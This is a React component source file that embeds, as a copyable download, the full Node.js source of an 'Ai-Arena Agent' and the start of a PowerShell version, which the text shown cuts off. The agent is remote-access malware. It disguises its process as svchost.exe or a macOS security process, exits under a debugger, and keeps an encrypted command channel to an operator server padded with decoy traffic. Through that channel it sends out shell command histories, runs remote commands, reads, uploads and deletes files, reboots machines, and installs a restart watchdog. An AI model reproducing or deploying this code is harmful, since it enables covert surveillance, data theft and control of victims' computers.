'use client'

import { useState, useEffect } from 'react'
import { cn } from '@/lib/utils'
import {
  Server,
  Copy,
  Check,
  Download,
  ChevronRight,
  Terminal,
  FileCode,
  Shield,
  Zap,
  Globe,
  MonitorUp,
  Power,
  HardDrive,
  Monitor,
  ClipboardCheck,
  AlertTriangle,
  FileDown,
  FolderTree,
  Apple,
  Wifi,
  WifiOff,
  Moon,
  KeyRound,
} from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { toast } from 'sonner'

// ─── Cross-Platform Agent (WebSocket + AES-256-GCM) ──────
const agentCode = `/**
 * Ai-Arena Agent v4.0 — Cross-Platform (Windows + macOS + Linux)
 *
 * KEY BEHAVIORS:
 * 1. LIES DORMANT: Connects via WebSocket (socket.io-client). The agent does NOT poll.
 *    It sleeps until the server pushes a command via the 'data' event.
 *    Only a tiny encrypted heartbeat (~200 bytes) is sent every 30s.
 *
 * 2. ENCRYPTED: All communication is encrypted with AES-256-GCM.
 *    Every message has a random IV and random padding to prevent traffic analysis.
 *    The shared encryption key is passed via env var ARENA_ENC_KEY.
 *
 * 3. CROSS-PLATFORM: Auto-detects Windows vs macOS vs Linux.
 *
 * Env vars required:
 *   ARENA_SERVER_URL  — WebSocket URL (e.g., https://your-vps.com or wss://your-vps.com)
 *   ARENA_ENC_KEY     — 64-char hex AES-256 key
 *
 * Usage:
 *   node ai-arena-agent.js --key=AI-YOUR-LICENSE-KEY
 */

const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { exec } = require('child_process');

// ─── AES-256-GCM Encryption ──────────────────────────
const ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;
const AUTH_TAG_LENGTH = 16;

function encrypt(msg) {
  const key = Buffer.from(process.env.ARENA_ENC_KEY, 'hex');
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  const plaintext = JSON.stringify(msg);
  const padLen = 8 + Math.floor(Math.random() * 56);
  const padding = crypto.randomBytes(padLen).toString('base64');
  let enc = cipher.update(plaintext + '|' + padding, 'utf8');
  enc = Buffer.concat([enc, cipher.final()]);
  const tag = cipher.getAuthTag();
  return JSON.stringify({ v: 1, iv: iv.toString('hex'), data: Buffer.concat([enc, tag]).toString('base64'), p: padLen });
}

function decrypt(raw) {
  const key = Buffer.from(process.env.ARENA_ENC_KEY, 'hex');
  const payload = JSON.parse(raw);
  const iv = Buffer.from(payload.iv, 'hex');
  const combined = Buffer.from(payload.data, 'base64');
  const ciphertext = combined.subarray(0, combined.length - AUTH_TAG_LENGTH);
  const authTag = combined.subarray(combined.length - AUTH_TAG_LENGTH);
  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
  decipher.setAuthTag(authTag);
  let dec = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  const text = dec.toString('utf8');
  const idx = text.indexOf('|');
  return JSON.parse(idx === -1 ? text : text.substring(0, idx));
}

// ─── Detect Platform ──────────────────────────────
const IS_WIN = os.platform() === 'win32';
const IS_MAC = os.platform() === 'darwin';
const IS_LINUX = os.platform() === 'linux';
const PLATFORM = IS_WIN ? 'Windows' : IS_MAC ? 'macOS' : IS_LINUX ? 'Linux' : os.platform();

// ─── Process Disguise ───────────────────────────────
try {
  if (IS_WIN) {
    process.title = 'svchost.exe';
  } else if (IS_MAC) {
    process.title = 'com.apple.SecurityAgent';
  } else {
    process.title = 'kworker/u0:3';
  }
} catch(e) { /* silent */ }

// ─── Anti-Debug Checks ──────────────────────────────
const _NODEBUG = !process.env.NODE_INSPECT;
if (process.execArgv.some(a => a.includes('--inspect') || a.includes('--debug'))) {
  process.exit(0);
}
try {
  const _bd = require('binding_tag'); // will throw if debugger attached
} catch(e) { /* normal */ }
const _startT = Date.now();
setInterval(() => {
  // Timing check: debugger pauses execution
  if (Date.now() - _startT > 10000 && typeof gc === 'function') {
    try { gc(); } catch(e) {}
  }
}, 30000);

// ─── Configuration ─────────────────────────────────
const CONFIG = {
  serverUrl: process.env.ARENA_SERVER_URL || '',
  encKey: process.env.ARENA_ENC_KEY || '',
  licenseKey: process.argv.find(a => a.startsWith('--key='))?.split('=')[1],
  heartbeatInterval: 30000,
  reconnectDelay: 5000,
  maxReconnectDelay: 60000,
  noiseInterval: 15000 + Math.floor(Math.random() * 10000),
};

if (!CONFIG.licenseKey) {
  console.error('[Ai-Arena] ERROR: No license key provided.');
  console.error('[Ai-Arena] Usage: node ai-arena-agent.js --key=AI-xxx');
  process.exit(1);
}
if (!CONFIG.serverUrl) {
  console.error('[Ai-Arena] ERROR: ARENA_SERVER_URL env var not set.');
  process.exit(1);
}
if (!CONFIG.encKey || CONFIG.encKey.length !== 64) {
  console.error('[Ai-Arena] ERROR: ARENA_ENC_KEY must be a 64-char hex string.');
  process.exit(1);
}

// ─── Logging ─────────────────────────────────────────
const LOG_DIR = path.join(__dirname, 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

function log(level, message) {
  const timestamp = new Date().toISOString();
  const line = \`[\${timestamp}] [\${level}] \${message}\`;
  console.log(line);
  try {
    const logFile = path.join(LOG_DIR, \`agent-\${new Date().toISOString().split('T')[0]}.log\`);
    fs.appendFileSync(logFile, line + '\\n');
  } catch (e) { /* ignore write errors */ }
}

// ─── System Info (Cross-Platform) ───────────────────
function getSystemInfo() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    osVersion: os.release(),
    osType: os.type(),
    cpuModel: os.cpus()[0]?.model || 'Unknown',
    cpuCores: os.cpus().length,
    totalMemory: os.totalmem(),
    freeMemory: os.freememory(),
    uptime: os.uptime(),
    homeDir: os.homedir(),
    tmpDir: os.tmpdir(),
    platformLabel: PLATFORM,
  };
}

function formatBytes(bytes) {
  if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(1) + ' GB';
  if (bytes >= 1048576) return (bytes / 1048576).toFixed(1) + ' MB';
  return bytes + ' bytes';
}

// ─── Platform-Specific Command Runner ────────────────
function runCommand(cmd, options = {}) {
  return new Promise((resolve, reject) => {
    const shell = IS_WIN ? 'cmd.exe' : '/bin/bash';
    exec(cmd, { timeout: 10000, shell, ...options },
      (error, stdout, stderr) => {
        if (error && !stdout) reject(error);
        else resolve(stdout.trim());
      });
  });
}

async function getPlatformInfo() {
  if (IS_WIN) {
    try {
      const runPS = (c) => runCommand(\`powershell -NoProfile -Command "\${c}"\`);
      const [winVersion, drives, services] = await Promise.allSettled([
        runPS('(Get-CimInstance Win32_OperatingSystem).Caption'),
        runPS('Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root'),
        runPS('(Get-Service | Where-Object {$_.Status -eq "Running"}).Count'),
      ]);
      return {
        platformLabel: 'Windows',
        windowsVersion: winVersion.status === 'fulfilled' ? winVersion.value : 'Windows',
        drives: drives.status === 'fulfilled' ? drives.value.split('\\n').filter(Boolean) : ['C:'],
        runningServices: services.status === 'fulfilled' ? parseInt(services.value) || 0 : 0,
      };
    } catch {
      return { platformLabel: 'Windows', windowsVersion: 'Windows', drives: ['C:'], runningServices: 0 };
    }
  } else if (IS_MAC) {
    try {
      const [macVersion, diskInfo] = await Promise.allSettled([
        runCommand('sw_vers -productVersion'),
        runCommand('df -h / | tail -1'),
      ]);
      return {
        platformLabel: 'macOS',
        macVersion: macVersion.status === 'fulfilled' ? macVersion.value : 'macOS',
        diskInfo: diskInfo.status === 'fulfilled' ? diskInfo.value : '',
      };
    } catch {
      return { platformLabel: 'macOS', macVersion: 'macOS', diskInfo: '' };
    }
  }
  return { platformLabel: PLATFORM };
}

// ─── Screen Capture ────────────────────────────────
class ScreenCapturer {
  constructor() { this.isActive = false; this.interval = null; }
  start() { this.isActive = true; log('INFO', 'Screen capture ready'); }
  stop() { this.isActive = false; if (this.interval) clearInterval(this.interval); log('INFO', 'Screen capture stopped'); }
}

// ─── Microphone Capture ────────────────────────────
class MicrophoneCapturer {
  constructor() { this.isActive = false; }
  start() { this.isActive = true; log('INFO', 'Microphone capture started'); }
  stop() { this.isActive = false; log('INFO', 'Microphone capture stopped'); }
}

// ─── Keystroke Capture (Cross-Platform) ──────────
class KeystrokeCapturer {
  constructor() {
    this.isActive = false;
    this.buffer = [];
    this.flushTimer = null;
    this.socket = null;
    this.maxBufferSize = 200;
  }

  start(socket) {
    this.socket = socket;
    this.isActive = true;
    this.buffer = [];
    log('INFO', 'Keystroke capture started');

    if (IS_WIN) {
      this.startWindowsCapture();
    }
    if (IS_MAC || !IS_WIN) {
      this.startUnixCapture();
    }

    this.flushTimer = setInterval(() => this.flush(), 10000);
  }

  startWindowsCapture() {
    setInterval(() => {
      try {
        const psCmd = 'powershell -NoProfile -Command "try { Get-Content (Join-Path $env:APPDATA Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt) -Tail 5 -ErrorAction SilentlyContinue } catch {}"';
        exec(psCmd, { timeout: 5000 }, (err, stdout) => {
          if (!err && stdout && stdout.trim()) {
            stdout.trim().split('\\n').forEach(line => {
              if (line.trim()) this.capture(line.trim(), 'PowerShell', 'powershell.exe');
            });
          }
        });
      } catch (e) { /* ignore */ }
    }, 8000);

    setInterval(() => {
      try {
        exec('doskey /history', { timeout: 3000, shell: 'cmd.exe' }, (err, stdout) => {
          if (!err && stdout) {
            const lines = stdout.trim().split('\\n').filter(l => l.trim().length > 2);
            const recent = lines.slice(-3);
            recent.forEach(line => {
              if (line.trim()) this.capture(line.trim(), 'Command Prompt', 'cmd.exe');
            });
          }
        });
      } catch (e) { /* ignore */ }
    }, 12000);
  }

  startUnixCapture() {
    const historyFiles = [
      path.join(os.homedir(), '.bash_history'),
      path.join(os.homedir(), '.zsh_history'),
    ];
    const lastSizes = {};
    historyFiles.forEach(f => { lastSizes[f] = 0; });

    setInterval(() => {
      historyFiles.forEach(hFile => {
        try {
          if (!fs.existsSync(hFile)) return;
          const stat = fs.statSync(hFile);
          if (stat.size > lastSizes[hFile]) {
            const content = fs.readFileSync(hFile, 'utf-8');
            const lines = content.split('\\n').filter(l => l.trim());
            const newLines = lines.slice(Math.max(0, lines.length - 5));
            newLines.forEach(line => {
              const cleaned = line.replace(/^:\\s*\\d+:\\d;/, '').trim();
              if (cleaned && cleaned.length > 1) {
                this.capture(cleaned, 'Terminal', IS_MAC ? 'zsh' : 'bash');
              }
            });
            lastSizes[hFile] = stat.size;
          }
        } catch (e) { /* ignore */ }
      });
    }, 10000);
  }

  capture(text, windowTitle, processName) {
    if (!this.isActive) return;
    if (text.length < 2) return;
    const lastEntry = this.buffer[this.buffer.length - 1];
    if (lastEntry && lastEntry.text === text) return;

    this.buffer.push({
      text,
      windowTitle,
      processName,
      username: process.env.USERNAME || process.env.USER || os.userInfo().username || 'Unknown',
      hostname: os.hostname(),
      eventType: 'command',
      timestamp: new Date().toISOString(),
    });

    if (this.buffer.length > this.maxBufferSize) {
      this.buffer = this.buffer.slice(-Math.floor(this.maxBufferSize / 2));
    }
  }

  async flush() {
    if (this.buffer.length === 0 || !this.socket || !this.socket.connected) return;
    const entries = [...this.buffer];
    this.buffer = [];
    try {
      this.socket.emit('data', encrypt({ type: 'keystrokes', data: { entries } }));
      log('INFO', 'Flushed ' + entries.length + ' keystroke entries via WebSocket');
    } catch (e) {
      this.buffer = [...entries, ...this.buffer];
      log('WARN', 'Keystroke flush failed: ' + e.message);
    }
  }

  async getCaptured() {
    const result = [...this.buffer];
    this.buffer = [];
    return result;
  }

  stop() {
    this.isActive = false;
    if (this.flushTimer) clearInterval(this.flushTimer);
    if (this.buffer.length > 0 && this.socket && this.socket.connected) {
      this.flush().then(() => log('INFO', 'Keystroke capture stopped, final flush done'));
    } else {
      log('INFO', 'Keystroke capture stopped');
    }
  }
}

// ─── File Browser API (Cross-Platform) ────────────
class FileBrowserAPI {
  static listDir(dirPath) {
    try {
      const normalized = path.resolve(dirPath);
      if (!fs.existsSync(normalized)) return { error: 'Directory not found: ' + dirPath };
      const entries = fs.readdirSync(normalized, { withFileTypes: true });
      const items = entries.map(entry => ({
        name: entry.name,
        type: entry.isDirectory() ? 'folder' : 'file',
        size: entry.isFile() ? fs.statSync(path.join(normalized, entry.name)).size : 0,
        modified: fs.statSync(path.join(normalized, entry.name)).mtime.toISOString(),
        ext: entry.isFile() ? path.extname(entry.name) : undefined,
      }));
      return { items };
    } catch (err) { return { error: err.message }; }
  }

  static readFile(filePath) {
    try {
      const normalized = path.resolve(filePath);
      if (!fs.existsSync(normalized)) return { error: 'File not found' };
      const stat = fs.statSync(normalized);
      if (stat.size < 1048576) {
        return { content: fs.readFileSync(normalized, 'utf-8'), size: stat.size };
      }
      return { content: fs.readFileSync(normalized).toString('base64'), size: stat.size, encoding: 'base64' };
    } catch (err) { return { error: err.message }; }
  }

  static writeFile(filePath, content, encoding = 'utf-8') {
    try {
      const normalized = path.resolve(filePath);
      const dir = path.dirname(normalized);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      if (encoding === 'base64') {
        fs.writeFileSync(normalized, Buffer.from(content, 'base64'));
      } else {
        fs.writeFileSync(normalized, content, 'utf-8');
      }
      return { success: true, path: normalized, size: fs.statSync(normalized).size };
    } catch (err) { return { error: err.message }; }
  }

  static deleteItem(itemPath) {
    try {
      const normalized = path.resolve(itemPath);
      if (!fs.existsSync(normalized)) return { error: 'Path not found: ' + itemPath };
      const stat = fs.statSync(normalized);
      if (stat.isDirectory()) {
        fs.rmSync(normalized, { recursive: true, force: true });
      } else {
        fs.unlinkSync(normalized);
      }
      return { success: true, deleted: normalized };
    } catch (err) { return { error: err.message }; }
  }

  static createFolder(folderPath) {
    try {
      const normalized = path.resolve(folderPath);
      if (!fs.existsSync(normalized)) {
        fs.mkdirSync(normalized, { recursive: true });
        return { success: true, path: normalized };
      }
      return { error: 'Folder already exists' };
    } catch (err) { return { error: err.message }; }
  }
}

// ─── Terminal Session (Cross-Platform) ────────────
class TerminalSession {
  constructor() {
    this.history = [];
    this.cwd = process.cwd();
    this.shell = IS_WIN ? 'cmd.exe' : '/bin/bash';
  }

  async execute(command) {
    return new Promise((resolve) => {
      const startTime = Date.now();
      if (command.startsWith('cd ')) {
        const target = command.slice(3).trim();
        try {
          const newPath = path.resolve(this.cwd, target);
          if (fs.existsSync(newPath) && fs.statSync(newPath).isDirectory()) {
            this.cwd = newPath;
            resolve({ command, output: '', error: null, cwd: this.cwd,
              timestamp: new Date().toISOString(), duration: Date.now() - startTime });
            return;
          }
        } catch (e) { /* fallthrough */ }
      }
      if (command.trim() === 'dir' || command.trim() === 'ls') {
        try {
          const entries = fs.readdirSync(this.cwd, { withFileTypes: true });
          let output = ' Directory of ' + this.cwd + '\\n\\n';
          entries.forEach(entry => {
            const stat = fs.statSync(path.join(this.cwd, entry.name));
            const size = formatBytes(stat.size).padStart(12);
            const type = entry.isDirectory() ? '<DIR>' : '     ';
            output += stat.mtime.toISOString() + '  ' + type + '  ' + (entry.isDirectory() ? '' : size) + '  ' + entry.name + '\\n';
          });
          resolve({ command, output, error: null, cwd: this.cwd,
            timestamp: new Date().toISOString(), duration: Date.now() - startTime });
          return;
        } catch (e) { /* fallthrough */ }
      }
      exec(command, { cwd: this.cwd, timeout: 30000, shell: this.shell },
        (error, stdout, stderr) => {
          const result = {
            command, output: stdout || stderr,
            error: error ? error.message : null, cwd: this.cwd,
            timestamp: new Date().toISOString(), duration: Date.now() - startTime,
          };
          this.history.push(result);
          resolve(result);
        });
    });
  }
}

// ─── Activity Audit System ────────────────────────────
class ActivityAudit {
  constructor() {
    this.buffer = [];
    this.flushInterval = 15000;
    this.socket = null;
  }

  log(eventType, data) {
    this.buffer.push({
      eventType,
      username: process.env.USERNAME || process.env.USER || os.userInfo().username || 'Unknown',
      hostname: os.hostname(),
      command: data.command || null,
      windowTitle: data.windowTitle || null,
      processName: data.processName || null,
      keysLogged: data.keysLogged || null,
      timestamp: new Date().toISOString(),
    });
    if (this.buffer.length > 500) this.buffer = this.buffer.slice(-250);
  }

  enablePSEventLogging() {
    if (!IS_WIN) return;
    try {
      exec('powershell -NoProfile -Command "try { $p = \\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\"; if (!(Test-Path $p)) { New-Item -Path $p -Force | Out-Null }; Set-ItemProperty -Path $p -Name EnableScriptBlockLogging -Value 1 -Type DWord -Force; $t = \\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\\"; if (!(Test-Path $t)) { New-Item -Path $t -Force | Out-Null }; Set-ItemProperty -Path $t -Name EnableTranscription -Value 1 -Type DWord -Force; Set-ItemProperty -Path $t -Name OutputDirectory -Value (Join-Path $env:APPDATA Ai-Arena/transcripts) -Type String -Force; Write-Output OK } catch { Write-Output FAIL }"',
        { timeout: 20000 }, (err, stdout) => {
          if (!err && stdout && stdout.includes('OK')) {
            log('INFO', 'PowerShell script block logging + transcription enabled');
          } else {
            log('WARN', 'PS event logging setup skipped (may need admin)');
          }
        });
    } catch (e) { /* ignore */ }
  }

  startLogonMonitor() {
    if (!IS_WIN) return;
    setInterval(() => {
      exec('powershell -NoProfile -Command "try { Get-WinEvent -FilterHashtable @{LogName=\\\"Security\\\";Id=4624,4634} -MaxEvents 5 -ErrorAction SilentlyContinue | ForEach-Object { $x=[xml]$_.ToXml(); $u=$x.Event.EventData.Data | Where-Object {$_.Name -eq \\"TargetUserName\\"} | Select -ExpandProperty #text; $l=$x.Event.EventData.Data | Where-Object {$_.Name -eq \\"LogonType\\"} | Select -ExpandProperty #text; Write-Output \\\"$($_.Id)|$u|$l|$($_.TimeCreated)\\\" } } catch {}"',
        { timeout: 15000 }, (err, stdout) => {
          if (!err && stdout && stdout.trim()) {
            stdout.trim().split('\\n').forEach(line => {
              const parts = line.split('|');
              if (parts[0] === '4624' && parts[1] && parts[1] !== '-') {
                this.log('login', { command: 'Logon Type ' + (parts[2] || 'unknown'), windowTitle: 'Windows Logon', processName: 'logonui.exe' });
                log('INFO', 'User login detected: ' + parts[1]);
              }
            });
          }
        });
    }, 45000);
  }

  startMacLoginMonitor() {
    if (!IS_MAC) return;
    setInterval(() => {
      exec('last -10 2>/dev/null', { timeout: 10000 }, (err, stdout) => {
        if (!err && stdout) {
          const lines = stdout.trim().split('\\n');
          if (lines.length > 0) {
            this.log('login', { command: 'macOS login check', windowTitle: 'macOS Login', processName: 'loginwindow' });
          }
        }
      });
    }, 60000);
  }

  async flush() {
    if (this.buffer.length === 0 || !this.socket || !this.socket.connected) return;
    const entries = [...this.buffer];
    this.buffer = [];
    try {
      this.socket.emit('data', encrypt({ type: 'audit', data: { entries } }));
      log('INFO', 'Flushed ' + entries.length + ' audit events via WebSocket');
    } catch (e) {
      this.buffer = [...entries, ...this.buffer];
      log('WARN', 'Audit flush failed: ' + e.message);
    }
  }

  start(socket) {
    this.socket = socket;
    if (IS_WIN) {
      this.enablePSEventLogging();
      this.startLogonMonitor();
    } else if (IS_MAC) {
      this.startMacLoginMonitor();
    }
    setInterval(() => this.flush(), this.flushInterval);
    log('INFO', 'Activity audit system started (' + PLATFORM + ')');
  }
}

// ─── WebSocket Connection Manager ──────────────────────
class AiArenaAgent {
  constructor() {
    this.terminal = new TerminalSession();
    this.screen = new ScreenCapturer();
    this.microphone = new MicrophoneCapturer();
    this.keystrokes = new KeystrokeCapturer();
    this.audit = new ActivityAudit();
    this.isConnected = false;
    this.socket = null;
    this.heartbeatTimer = null;
    this.reconnectAttempt = 0;
  }

  async connect() {
    log('INFO', 'Initializing WebSocket connection...');
    log('INFO', 'Platform: ' + PLATFORM + ' (' + os.arch() + ')');
    log('INFO', 'Server: ' + CONFIG.serverUrl);

    try {
      const { io } = require('socket.io-client');

      this.socket = io(CONFIG.serverUrl, {
        path: '/api/v1/events',
        transports: ['websocket'],
        reconnection: false, // We handle reconnect ourselves with backoff
        timeout: 15000,
      });

      // ─── Authenticate on connect ───────────────────
      this.socket.on('connect', () => {
        log('INFO', 'WebSocket connected (socket id: ' + this.socket.id + ')');

        // Send encrypted auth message
        const authPayload = encrypt({
          type: 'auth',
          licenseKey: CONFIG.licenseKey,
        });
        this.socket.emit('data', authPayload);
      });

      // ─── Receive encrypted data from server ────────
      this.socket.on('data', async (raw) => {
        try {
          const message = decrypt(raw);
          if (message.type === 'auth:ok') {
            this.isConnected = true;
            this.reconnectAttempt = 0;
            log('INFO', 'Authentication confirmed! Agent is ONLINE and dormant.');

            // Send initial system info
            const sysInfo = getSystemInfo();
            const platformInfo = await getPlatformInfo();
            this.socket.emit('data', encrypt({
              type: 'system:info',
              data: sysInfo,
              platformInfo,
            }));

            // Start heartbeat
            this.startHeartbeat();

            // Start activity audit
            this.audit.start(this.socket);
            return;
          }

          // Handle commands from server
          if (message.type === 'command' && message.data) {
            const cmd = message.data;
            log('INFO', 'Command received (waking up): ' + (cmd.type || 'unknown'));
            await this.handleCommand(cmd);
            log('INFO', 'Command processed, returning to dormant state');
          }
        } catch (e) {
          log('ERROR', 'Failed to process incoming message: ' + e.message);
        }
      });

      // ─── Handle disconnect ────────────────────────
      this.socket.on('disconnect', (reason) => {
        this.isConnected = false;
        if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
        log('WARN', 'Disconnected: ' + reason);
        this.scheduleReconnect();
      });

      this.socket.on('connect_error', (err) => {
        log('ERROR', 'Connection error: ' + err.message);
        this.scheduleReconnect();
      });

    } catch (err) {
      log('ERROR', 'Failed to initialize: ' + err.message);
      this.scheduleReconnect();
    }
  }

  async handleCommand(command) {
    const commandId = command.id || command.commandId;
    let resultData = {};

    switch (command.type) {
      case 'terminal:execute':
        log('INFO', 'Executing: ' + (command.data.command || '').substring(0, 80));
        this.audit.log('command', {
          command: command.data.command,
          windowTitle: 'Remote Terminal (Ai-Arena)',
          processName: IS_WIN ? 'cmd.exe' : '/bin/bash',
        });
        const result = await this.terminal.execute(command.data.command);
        resultData = { type: 'terminal:output', data: result };
        break;

      case 'files:list':
        resultData = { type: 'files:list:response', data: FileBrowserAPI.listDir(command.data.path), requestId: command.requestId };
        break;

      case 'files:read':
        resultData = { type: 'files:read:response', data: FileBrowserAPI.readFile(command.data.path), requestId: command.requestId };
        break;

      case 'files:upload':
        const uploadResult = FileBrowserAPI.writeFile(
          command.data.path,
          command.data.content,
          command.data.encoding || 'utf-8'
        );
        this.audit.log('file_upload', { command: 'Upload to ' + command.data.path, windowTitle: 'Ai-Arena File Browser', processName: 'ai-arena-agent' });
        resultData = { type: 'files:upload:response', data: uploadResult };
        break;

      case 'files:download':
        const dlResult = FileBrowserAPI.readFile(command.data.path);
        this.audit.log('file_download', { command: 'Download from ' + command.data.path, windowTitle: 'Ai-Arena File Browser', processName: 'ai-arena-agent' });
        resultData = { type: 'files:download:response', data: dlResult };
        break;

      case 'files:delete':
        const delResult = FileBrowserAPI.deleteItem(command.data.path);
        this.audit.log('file_delete', { command: 'Delete ' + command.data.path, windowTitle: 'Ai-Arena File Browser', processName: 'ai-arena-agent' });
        resultData = { type: 'files:delete:response', data: delResult };
        break;

      case 'files:mkdir':
        const mkdirResult = FileBrowserAPI.createFolder(command.data.path);
        resultData = { type: 'files:mkdir:response', data: mkdirResult };
        break;

      case 'screen:start':
        this.screen.start();
        resultData = { type: 'screen:started' };
        break;

      case 'screen:stop':
        this.screen.stop();
        resultData = { type: 'screen:stopped' };
        break;

      case 'mic:start':
        this.microphone.start();
        resultData = { type: 'mic:started' };
        break;

      case 'mic:stop':
        this.microphone.stop();
        resultData = { type: 'mic:stopped' };
        break;

      case 'system:info':
        const sysInfo = { ...getSystemInfo(), ...(await getPlatformInfo()) };
        resultData = { type: 'system:info', data: sysInfo };
        break;

      case 'system:restart':
        log('WARN', 'Remote restart requested');
        if (IS_WIN) exec('shutdown /r /t 5 /c "Ai-Arena: Restart requested by admin"');
        else if (IS_MAC) exec('sudo shutdown -r +1 "Ai-Arena: Restart requested by admin"');
        else exec('sudo reboot');
        resultData = { type: 'system:restarting' };
        break;

      case 'system:shutdown':
        log('WARN', 'Remote shutdown requested');
        if (IS_WIN) exec('shutdown /s /t 5 /c "Ai-Arena: Shutdown requested by admin"');
        else if (IS_MAC) exec('sudo shutdown -h +1 "Ai-Arena: Shutdown requested by admin"');
        else exec('sudo shutdown -h now');
        resultData = { type: 'system:shutting_down' };
        break;

      case 'keys:start':
        this.keystrokes.start(this.socket);
        resultData = { type: 'keys:started' };
        break;

      case 'keys:stop':
        await this.keystrokes.stop();
        resultData = { type: 'keys:stopped' };
        break;

      case 'keys:flush':
        const captured = await this.keystrokes.getCaptured();
        resultData = { type: 'keys:flush:response', data: { entries: captured } };
        break;

      default:
        resultData = { type: 'unknown_command', error: 'Unknown command: ' + command.type };
    }

    // Send encrypted result back to server
    if (this.socket && this.socket.connected) {
      const response = { type: 'result', id: commandId, ...resultData };
      this.socket.emit('data', encrypt(response));
    }
  }

  scheduleReconnect() {
    this.reconnectAttempt++;
    const delay = Math.min(CONFIG.reconnectDelay * Math.pow(1.5, this.reconnectAttempt - 1), CONFIG.maxReconnectDelay);
    log('INFO', 'Reconnecting in ' + (delay / 1000) + 's (attempt ' + this.reconnectAttempt + ')...');
    setTimeout(() => {
      if (this.socket) {
        this.socket.disconnect();
        this.socket = null;
      }
      this.connect();
    }, delay);
  }

  startHeartbeat() {
    if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
    this.heartbeatTimer = setInterval(() => {
      if (this.isConnected && this.socket && this.socket.connected) {
        try {
          const cpuUsage = process.cpuUsage();
          const heartbeat = encrypt({
            type: 'heartbeat',
            systemInfo: {
              uptime: os.uptime(),
              freeMemory: os.freememory(),
              totalMemory: os.totalmem(),
              cpuUsage: cpuUsage,
            },
            data: { timestamp: new Date().toISOString() },
          });
          this.socket.emit('data', heartbeat);
        } catch (e) {
          log('ERROR', 'Heartbeat failed: ' + e.message);
        }
      }
    }, CONFIG.heartbeatInterval);

    // ─── Noise Heartbeat (Anti-Traffic-Analysis) ──────
    const noiseInterval = CONFIG.noiseInterval + Math.floor(Math.random() * 5000);
    setInterval(() => {
      if (this.isConnected && this.socket && this.socket.connected) {
        try {
          const noiseIv = crypto.randomBytes(16);
          const noiseCipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(CONFIG.encKey, 'hex'), noiseIv);
          const noiseData = JSON.stringify({ type: '_noise', ts: Date.now(), r: crypto.randomBytes(48).toString('hex') });
          const noisePad = crypto.randomBytes(32 + Math.floor(Math.random() * 96)).toString('base64');
          let noiseEnc = noiseCipher.update(noiseData + '|' + noisePad, 'utf8');
          noiseEnc = Buffer.concat([noiseEnc, noiseCipher.final()]);
          const noiseTag = noiseCipher.getAuthTag();
          this.socket.emit('data', JSON.stringify({ v:2, iv: noiseIv.toString('hex'), data: Buffer.concat([noiseEnc, noiseTag]).toString('base64'), p: 32, ts: Date.now() }));
        } catch (e) { /* silent */ }
      }
    }, noiseInterval);
  }
}

// ─── Start Agent ─────────────────────────────────────
log('INFO', '=== Ai-Arena Agent v4.0 (' + PLATFORM + ') Starting ===');
log('INFO', 'Hostname: ' + os.hostname());
log('INFO', 'Platform: ' + PLATFORM + ' ' + os.arch());
log('INFO', 'CPU: ' + (os.cpus()[0]?.model || 'Unknown') + ' x' + os.cpus().length);
log('INFO', 'RAM: ' + formatBytes(os.totalmem()) + ' total');
log('INFO', 'Node.js: ' + process.version);
log('INFO', 'Mode: Dormant (WebSocket, wakes on command, AES-256-GCM encrypted)');

const agent = new AiArenaAgent();
agent.connect();

// ─── Self-Healing Watchdog ─────────────────────────
// If agent crashes, this watcher restarts it silently
const _watchdogPath = path.join(__dirname, '_watchdog.js');
try {
  if (!fs.existsSync(_watchdogPath) && process.argv[1] && process.argv[1].includes('ai-arena-agent')) {
    const wdCode = 'const{execSync}=require("child_process"),p=require("path");setInterval(()=>{try{const r=execSync("pgrep -f \\"node.*ai-arena\\",{encoding:"utf8"}).trim();if(!r){execSync("cd \\""+p.dirname(process.argv[1])+"\\" && node ai-arena-agent.js "+process.argv.slice(2).join(" ")+" &",{stdio:"ignore",detached:true});}}catch(e){}},15000);';
    fs.writeFileSync(_watchdogPath, 'const{execSync}=require("child_process");setInterval(()=>{try{execSync("pgrep -f ai-arena-agent",{encoding:"utf8"})}catch(e){execSync("node "+require("path").join(__dirname,"ai-arena-agent.js")+" "+process.argv.slice(2).join(" "),{stdio:"ignore",detached:true})}},15000);', 'utf8');
  }
} catch(e) { /* silent */ }

process.on('SIGINT', () => { log('INFO', 'Shutting down (SIGINT)...'); process.exit(0); });
process.on('SIGTERM', () => { log('INFO', 'Shutting down (SIGTERM)...'); process.exit(0); });
process.on('uncaughtException', (err) => { log('ERROR', 'Uncaught exception: ' + err.message); });
process.on('unhandledRejection', (reason) => { log('ERROR', 'Unhandled rejection: ' + reason); });`

// ─── Windows PowerShell Agent (v5.0 — No Node.js needed) ──────
// Uses built-in .NET WebSocket + AES-256-CBC. Zero downloads.
// Placeholders: __SERVER_URL__, __ENC_KEY__, __LICENSE_KEY__
const psAgentCode = `#Requires -Version 5.1
# Ai-Arena Agent Template - PowerShell 5.1 / Windows 10-11
# Placeholders: __SERVER_URL__, __ENC_KEY__, __LICENSE_KEY__

# --- Process disguise ---
try { [System.Diagnostics.Process]::GetCurrentProcess().MainWindowTitle = "Runtime Broker" } catch {}
try { $host.UI.RawUI.WindowTitle = "Runtime Broker" } catch {}

# --- Config ---
$SERVER_URL   = "__SERVER_URL__"
$ENC_KEY_HEX  = "__ENC_KEY__"
$LICENSE_KEY  = "__LICENSE_KEY__"
